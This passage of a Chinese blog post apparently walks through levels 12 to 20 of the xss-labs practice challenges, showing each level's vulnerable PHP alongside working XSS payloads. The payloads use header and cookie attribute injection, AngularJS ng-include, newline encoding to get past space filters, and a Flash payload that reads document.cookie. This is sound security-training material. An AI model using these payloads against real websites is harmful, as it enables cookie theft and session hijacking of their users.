+<li>有个参数t_ua的后面是我们的User Agent信息，所以直接试一试上一关的payload，通过HackBar的User Agent提交。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_USER_AGENT'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<h1 id="13-xss-level13">13. xss-level13</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>有个cook参数，猜测使用Cookies可以提交，使用上上关payload，发现cook内容里的参数消失了。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE[&quot;user&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>这里COOKIE提交的是user参数，更改payload增加user参数尝试。</li>
+</ul>
+<ol start="3">
+<li></li>
+</ol>
+<pre><code>Cookies：user=&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="14-xss-level14">14. xss-level14</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
+&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
+&lt;/body&gt;
+</code></pre>
+<ul>
+<li>会自动跳转到http://www.exifviewer.org/?z的页面，并且没有php的代码，一头雾水</li>
+</ul>
+<ol start="2">
+<li>通过上网查询，得到解释，这里本来是一个exif xss的漏洞，要将xss代码写进exif里面，但是现在没有办法进行测试。</li>
+<li>大致的意思为需要上传一个带有xss信息的图片来触发xss。</li>
+<li>通过设置图片的主题或者标题为xss代码，上传图片。</li>
+<li>模拟xss-level14的php代码。</li>
+</ol>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;title&gt;欢迎来到level14&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
+&lt;!--&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;--&gt;
+    &lt;?php
+   echo &quot;&lt;center&gt;
+   &lt;form action=level14.php method=POST enctype=multipart/form-data&gt;
+   &lt;label for=file&gt;文件名：&lt;/label&gt;
+   &lt;input type=file name=file id=file&gt;&lt;br&gt;
+   &lt;input type=submit name=submit value=提交&gt;
+&lt;/form&gt;&lt;/center&gt;&quot;;
+
+// 允许上传的图片后缀
+$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
+$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
+echo $_FILES[&quot;file&quot;][&quot;size&quot;];
+$extension = end($temp);     // 获取文件后缀名
+if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb
+&amp;&amp; in_array($extension, $allowedExts))
+{
+    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+    {
+        echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
+    }
+    else
+    {
+        echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;
+        echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;
+        echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;
+        echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br&gt;&quot;;
+    
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $_FILES[&quot;file&quot;][&quot;name&quot;]);
+    }
+}
+else
+{
+    echo &quot;非法的文件格式&quot;;
+}
+    $file = $_FILES[&quot;file&quot;][&quot;name&quot;];
+    echo $file;
+
+    $exif = exif_read_data($file);
+    var_dump($exif)
+?&gt;
+&lt;?php
+
+?&gt;
+&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/level15.php?src=level15.png&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="15-xss-level15">15. xss-level15</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;html ng-app&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level16.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level15&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
+&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
+&lt;body&gt;&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>因为原先的https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js被墙了，所以换成https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;src&quot;];
+echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>ng-include 指令使用了AngularJS，可以通过新的属性，新的表达式扩展HTML。</li>
+<li>可以用于包含外部的 HTML 文件。</li>
+<li>包含的内容将作为指定元素的子节点。</li>
+<li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li>
+<li>默认情况下，包含的文件需要包含在同一个域名下。</li>
+<li>值得注意
+<ul>
+<li>如果要指定单纯的地址，必须要加上引号。</li>
+<li>当加载外部html文件时，scritp标签中的内容不会被执行，含有style标签样式可以被执行。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level15.php?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'
+</code></pre>
+<ul>
+<li>这里已经知道了可以通过使用ng-include来包含HTML的内容</li>
+<li>在.php后面增加了参数值。类似于访问了该文件参数值之后，将该值包含在html文件后响应。</li>
+</ul>
+<h1 id="16-xss-level16">16. xss-level16</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+&lt;center&gt;&lt;&amp;nbsp;&gt;alert()&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
+$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>script，空格，斜杠都被处理了，这里也没有一个值需要进行包裹。</li>
+<li>用之前15关的方法，但是空格被实体化了，所以这里有绕过技巧涉及到url编码。</li>
+<li>而我们又知道仅仅只在html代码中进行换行对实际的代码是没有效果的，所以这里可以用回车的url编码%0a来代替空格。</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;
+</code></pre>
+<h1 id="17-xss-level17">17. xss-level17</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
+&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
+&lt;/body&gt;
+</code></pre>
+<ul>
+<li>特别说明：这之后的关卡需要用到flash插件</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>arg01 arg02被过滤掉了，这里没有引号，不需要对src进行包裹，直接在后面加上payload，移动鼠标进行弹窗。</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>onmouseover=alert()
+</code></pre>
+<h1 id="18-xss-level18">18. xss-level18</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
+&lt;embed src=xsf02.swf?a=b width=100% heigth=100%&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>查看17，18两关的代码基本上没有什么差别，用第17关的payload也可以通过</li>
+</ul>
+<h1 id="19-xss-level19">19. xss-level19</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
+&lt;embed src=&quot;xsf03.swf?a=b&quot; width=100% heigth=100%&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo '&lt;embed src=&quot;xsf03.swf?'.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).'&quot; width=100% heigth=100%&gt;';
+?&gt;
+</code></pre>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
+</code></pre>
+<ol start="4">
+<li><a href="https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187">xss19</a></li>
+</ol>
+<h1 id="20-xss-level20">20. xss-level20</h1>
+<pre><code>level20.php?arg01=id&amp;arg02=\&quot;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
+</code></pre>
+<p><a href="https://blog.csdn.net/u014029795/article/details/103217680">xss20</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://kite-007.github.io/eXYhxljM_/" class="tag">
+                    xss
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/">
+                  <h3 class="post-title">
+                    php 伪协议与钓鱼
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
